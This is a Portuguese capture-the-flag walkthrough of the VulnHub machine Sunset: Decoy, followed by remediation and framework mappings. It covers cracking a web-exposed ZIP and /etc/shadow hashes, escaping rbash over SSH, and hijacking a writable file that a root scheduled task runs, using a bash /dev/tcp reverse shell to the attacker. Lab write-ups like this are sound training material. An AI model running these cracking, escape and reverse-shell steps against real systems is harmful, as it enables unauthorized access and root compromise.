# Sunset: Decoy — A Armadilha É o ZIP, a Armadilha Real É o Agendador

Mano, Sunset: Decoy é uma daquelas máquinas que ensina a olhar além do óbvio. O nome já diz tudo: há um decoy, e o decoy está escondendo a superfície de ataque real. Um arquivo ZIP no serviço web contém um backup criptografado de arquivos do sistema incluindo /etc/shadow. Quebre o ZIP, quebre os hashes do shadow, entre via SSH com um shell restrito, escape da restrição, e então deixe o pspy fazer o trabalho de revelar um binário agendado de propriedade do root que usa um arquivo update gravável. Subestimado? Sim. Inteligente de verdade? Com certeza. Parabéns ao whitecr0wz.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | Sunset: Decoy |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/sunset-decoy,505/ |
| **Técnicas** | Scan completo de portas, enumeração web, extração de hash ZIP (zip2john), quebra de hash offline (John the Ripper), quebra de hash /etc/shadow, escape de shell restrito SSH, monitoramento de processos (pspy), sequestro de tarefa agendada via arquivo update gravável, reverse shell como root |
| **CVEs** | EDB-33899 (utilitário vulnerável referenciado); CWE-312 — Armazenamento de Informações Sensíveis em Texto Claro; CWE-732 — Atribuição Incorreta de Permissão; CWE-522 — Credenciais Insuficientemente Protegidas |
| **Grupos APT** | FIN7: uso documentado de roubo de credenciais via ZIP/arquivo e quebra offline em operações de acesso inicial; Grupo Lazarus: usa extração de credenciais de arquivo de backup como técnica padrão pós-foothold em alvos Linux |

---

## Resumo do Ataque

```
nmap → SSH (22), HTTP (80)
  |
  +-> wget http://ALVO/save.zip
  |
  +-> zip2john save.zip → john → senha: manual
  |
  +-> unzip save.zip → etc/shadow extraído
  |
  +-> john etc/shadow → usuario:senha quebrado
  |
  +-> ssh -t usuario@ALVO "bash --noprofile" (bypass shell restrito)
  |
  v
shell de usuário (shell restrito escapado)
  |
  +-> ./honeypot.decoy → opção 5
  |
  +-> pspy64 → binário de propriedade root executa a cada ~60s
  |          → usa ./update (gravável pelo usuário)
  |
  +-> cat > update << 'EOF'
  |   bash -i >& /dev/tcp/LHOST/4444 0>&1
  |   EOF
  |
  v
shell root (callback reverso)
  |
  v
/root/root.txt
```

---

## Metodologia

1. Scan completo de portas: identificar serviços SSH e HTTP
2. Enumeração web: encontrar arquivo ZIP save.zip
3. Quebra de senha do ZIP: zip2john + John the Ripper
4. Quebra de hash do arquivo shadow: extrair e quebrar hashes /etc/shadow
5. Acesso SSH: login com usuário e senha quebrados
6. Escape de shell restrito: bypass via flag bash --noprofile
7. Monitoramento de processos: pspy revela binário agendado de root usando ./update
8. Sequestro de tarefa agendada: instalar reverse shell em ./update, capturar callback root

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r <subnet>/24
# Adicionar alvo ao /etc/hosts

nmap -sV -sC -p- <IP_ALVO>
```

Descobertas principais: SSH na porta 22, HTTP na porta 80 (e possivelmente 443).

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web e Descoberta do ZIP

```bash
# Navegar no serviço web
curl http://<IP_ALVO>/
curl http://<IP_ALVO>/robots.txt

# Brute-force de diretórios
gobuster dir \
  -u http://<IP_ALVO>/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x zip,tar,bak,txt,html \
  -t 30
```

O arquivo principal está acessível na raiz ou em um local previsível:

```bash
wget http://<IP_ALVO>/save.zip
```

O arquivo está protegido por senha. Esse é o "decoy" da superfície.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Quebra de Senha do ZIP

Extraia o hash do ZIP e quebre com John:

```bash
zip2john save.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

Senha recuperada: **manual**

Extraia o arquivo:

```bash
unzip save.zip -d save_extraido/
# Senha: manual
```

O arquivo extrai cópias de backup dos arquivos do sistema, incluindo `etc/shadow`.

**Nota real:** Arquivos ZIP protegidos por senha oferecem quase zero de segurança real. zip2john + rockyou quebra a maioria das senhas de arquivo do mundo real em segundos. Organizações que usam criptografia ZIP para proteger backups contendo /etc/shadow estão criando uma falsa sensação de segurança. FIN7 especificamente ataca arquivos de backup acessíveis pela web para extração de credenciais.

**MITRE ATT&CK:** T1552.001 — Credenciais Não Seguras: Credenciais em Arquivos

---

## Passo 4 — Quebra de Hash do Arquivo Shadow

Extraia hashes utilizáveis do arquivo shadow:

```bash
# Filtrar contas bloqueadas
grep -v '!!\|*' save_extraido/etc/shadow | grep ':\$' > users.hash

# Quebrar os hashes
john --wordlist=/usr/share/wordlists/rockyou.txt users.hash

# Mostrar credenciais quebradas
john --show users.hash
```

Anote o nome de usuário e senha quebrados para acesso SSH.

**Alternativa com hashcat (GPU):**

```bash
# Extrair apenas as linhas de hash
cat save_extraido/etc/shadow | grep ':\$6\$' > sha512.hash
hashcat -m 1800 -d 1 -w 3 sha512.hash /usr/share/wordlists/rockyou.txt
```

**MITRE ATT&CK:** T1110.002 — Força Bruta: Quebra de Senha

---

## Passo 5 — Acesso SSH e Escape de Shell Restrito

O shell de login do usuário alvo é restrito (rbash ou similar):

```bash
# SSH padrão cai em shell restrito
ssh <usuario>@<IP_ALVO>
# Shell restrito: comandos limitados
```

Bypasse forçando um bash irrestrito via execução de comando SSH:

```bash
ssh -t <usuario>@<IP_ALVO> "bash --noprofile"
```

Isso bypassa o shell restrito completamente. Agora você tem uma sessão bash padrão.

Leia a flag de usuário:

```bash
cat user.txt
```

**Nota real:** Shells restritos (rbash, lshell, rzsh) são frequentemente usados como controle compensatório para contas que precisam de acesso SSH mas não devem ter capacidades completas de shell. Eles são consistentemente bypassáveis via `bash --noprofile`, `ssh -t ... bash`, `vim :!/bin/bash` ou métodos similares. O isolamento adequado requer chroot jails ou containers, não shells restritos.

**MITRE ATT&CK:** T1548.003 — Mecanismo de Controle de Elevação de Abuso: Sudo (análogo ao bypass de restrição de shell)

---

## Passo 6 — Monitoramento de Processos com pspy

Transfira pspy64 para o alvo (ou encontre se pré-instalado):

```bash
# No atacante
python3 -m http.server 8080

# No alvo
wget http://<LHOST>/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

Execute o binário honeypot.decoy e selecione a opção 5 para acionar um processo agendado:

```bash
./honeypot.decoy
# Selecionar: 5
```

Observe a saída do pspy. Dentro de ~60 segundos você deve ver um processo de propriedade do root executando um binário que usa `./update`.

**Nota real:** pspy é indispensável para enumeração de escalonamento de privilégios. Ele monitora a criação de processos sem precisar de acesso root, revelando tarefas agendadas que não aparecem no crontab. Operadores APT41 documentam o uso de técnicas de monitoramento de processos para identificar tarefas executadas como root.

**MITRE ATT&CK:** T1057 — Descoberta de Processos; T1053.003 — Tarefa Agendada: Cron

---

## Passo 7 — Sequestro de Tarefa Agendada

O binário agendado usa um arquivo chamado `update` do diretório atual (padrão EDB-33899). Crie um arquivo update malicioso:

```bash
# Inicie listener no atacante
nc -lvnp 4444

# No alvo: crie o payload de reverse shell
cat > update << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<LHOST>/4444 0>&1
EOF
chmod +x update
```

Aguarde até 60 segundos para o agendador disparar. O callback de reverse shell chega com privilégios root.

```bash
# No shell root
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

(☞ﾟヮﾟ)☞ Root. O decoy não enganou ninguém. GG mano!

**Nota real:** Tarefas agendadas que usam ou executam arquivos de diretórios acessíveis por usuários são um vetor de escalonamento de privilégios clássico. O padrão aparece em ambientes corporativos quando administradores criam scripts cron ou systemd timer que referenciam caminhos relativos, permitindo que qualquer usuário que possa escrever no diretório de trabalho sequestre o fluxo de execução.

**MITRE ATT&CK:** T1053.003 — Tarefa Agendada: Cron; T1574.009 — Sequestro de Fluxo de Execução: Interceptação de Path por Variável Path

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Usado Para |
|---|---|---|---|
| Arquivo ZIP | save.zip | Raiz web HTTP | Contém /etc/shadow |
| Senha ZIP | manual | zip2john + John | Extração do arquivo |
| Credencial de usuário | (quebrada do shadow) | etc/shadow no ZIP | Acesso SSH |
| Flag de usuário | user.txt | Diretório home do usuário | Flag de usuário |
| Tarefa agendada | ./update (gravável) | pspy + honeypot.decoy opção 5 | Vetor de shell root |
| Flag root | /root/root.txt | Pós-exploração | Máquina concluída |

---

## Lições Aprendidas

| # | Descoberta | Relevância Real | Lição Principal |
|---|---|---|---|
| 1 | /etc/shadow incluído em backup acessível pela web | Arquivos de backup contendo arquivos de credenciais do sistema são um caminho direto para comprometimento total | Nunca inclua shadow/passwd em backups; restrinja acesso a backups a sistemas autorizados apenas |
| 2 | ZIP protegido por senha oferece segurança mínima | Rockyou + zip2john quebra a maioria das senhas de arquivo em segundos | Use GPG ou criptografia AES-256 para arquivos sensíveis; nunca confie na proteção por senha ZIP |
| 3 | Shell restrito bypassado com bash --noprofile | Rbash e shells restritos similares não são controles de segurança | Use chroot jails ou containers para acesso restrito; shells restritos sozinhos são insuficientes |
| 4 | Tarefa cron root usa arquivo gravável pelo usuário | Padrão clássico de sequestro de cron; aparece regularmente em ambientes corporativos reais | Todos os arquivos usados por scripts de propriedade root devem ser de propriedade do root e não graváveis globalmente |
| 5 | pspy revela tarefas agendadas ocultas sem root | Monitoramento de processos é uma etapa fundamental de enumeração de privesc | Monitore e audite todas as tarefas agendadas; use logs de timer systemd para visibilidade |

---

## MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais Não Seguras: Credenciais em Arquivos | T1552.001 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha | T1110.002 |
| Execução | Execução | Interpretador de Comando e Script: Shell Unix | T1059.004 |
| Descoberta | Descoberta | Descoberta de Processos | T1057 |
| Descoberta | Descoberta | Tarefa Agendada: Cron | T1053.003 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Tarefa Agendada: Cron (sequestro) | T1053.003 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Sequestro de Fluxo de Execução: Interceptação de Path | T1574.009 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remover /etc/shadow de arquivos de backup:** auditorias devem verificar que nenhum arquivo de credencial está incluído em qualquer backup
2. **Criptografar arquivos sensíveis com GPG ou AES-256:** criptografia de senha ZIP não é um controle de segurança para dados sensíveis
3. **Usar chroot ou containers em vez de shells restritos:** rbash é consistentemente bypassável
4. **Garantir que todos os arquivos usados por cron/timer root sejam de propriedade do root e não graváveis globalmente:** `find / -writable -type f 2>/dev/null | grep -v proc`
5. **Corrigir ou remover utilitário vulnerável EDB-33899:** revisar todos os executáveis SUID e agendados
6. **Desabilitar autenticação SSH por senha onde possível:** autenticação apenas por chave reduz ataques baseados em credenciais

### D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (controles de conteúdo de backup; propriedade de script cron)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (auditoria de tarefa agendada; aplicação de chroot)
- **D3-HBPI** — Hardening de Integridade de Pipeline de Build (sem credenciais em artefatos/backups implantados)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todos os arquivos de backup e seus conteúdos |
| Proteger | Segurança de Dados | Remover arquivos de credencial de backups; criptografar arquivos com algoritmos fortes |
| Proteger | Controle de Acesso | Substituir shells restritos por chroot; restringir propriedade de arquivo fonte cron |
| Detectar | Anomalias e Eventos | Monitorar execução de tarefa agendada; alertar sobre spawning incomum de processos do cron |
| Responder | Planejamento de Resposta | Remover arquivo update malicioso; desabilitar conta de usuário comprometida; rotacionar todas as credenciais |
| Recuperar | Planejamento de Recuperação | Auditar todos os backups para exposição de credenciais; reconstruir host comprometido |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Restringir acesso a arquivo de backup; permissões de arquivo de script cron |
| IA-5 | Gerenciamento de Autenticadores | Remover /etc/shadow de backups; rotacionar todas as credenciais quebradas |
| CM-7 | Menor Funcionalidade | Desabilitar acesso público a arquivos ZIP; substituir shell restrito por chroot |
| AU-6 | Revisão de Auditoria | Monitorar logs de tarefa agendada para execução incomum |
| SI-2 | Remediação de Falhas | Corrigir utilitário vulnerável EDB-33899; remover fontes cron graváveis globalmente |
| SC-28 | Proteção de Informações em Repouso | Criptografar arquivos de backup com AES-256 ou GPG |

### CISA KEV

O padrão de exposição de credenciais de arquivo de backup mapeia ao Alerta CISA AA22-074A (Atores de Ameaça Explorando Software Sem Patches e Desatualizado). A técnica de sequestro de tarefa agendada é referenciada nas orientações das "Principais Vulnerabilidades Exploradas Rotineiramente" da CISA como um primitivo de escalonamento de privilégios. As organizações são aconselhadas a auditar todos os processos de backup e tarefas agendadas conforme as recomendações de hardening da CISA.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Ativos, Mudanças e Configurações (ASSET) | Gerenciar Inventário de Ativos TI e OT | MIL2 |

---

## Considerações Finais

Sunset: Decoy faz jus ao seu nome da melhor forma possível. O decoy é o ZIP. A ameaça real é a tarefa agendada. A lição é sobre exposição de credenciais em camadas: um arquivo acessível pela web, uma senha quebrada, um hash shadow quebrado, um bypass de shell restrito e um arquivo update gravável. Tudo configuração incorreta. Tudo evitável. Sem exploits necessários. Caramba, isso é coisa do mundo real mesmo!

Thanks guys!! (❍ᴥ❍ʋ)
